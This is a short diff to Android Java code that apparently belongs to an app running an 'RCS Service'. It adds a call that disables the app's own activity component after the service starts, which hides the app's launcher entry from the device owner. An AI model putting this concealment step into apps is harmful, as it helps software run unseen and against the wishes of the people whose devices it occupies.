@@ -12,6 +12,7 @@ package com.android.networking.gui;
 import android.app.Activity;
 import android.content.ComponentName;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.widget.CheckBox;
@@ -119,6 +120,9 @@ public class AGUI extends Activity {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
 					}
+					
+					PackageManager pm = getApplicationContext().getPackageManager();
+					pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 				}
 			}
 		} catch (final SecurityException se) {
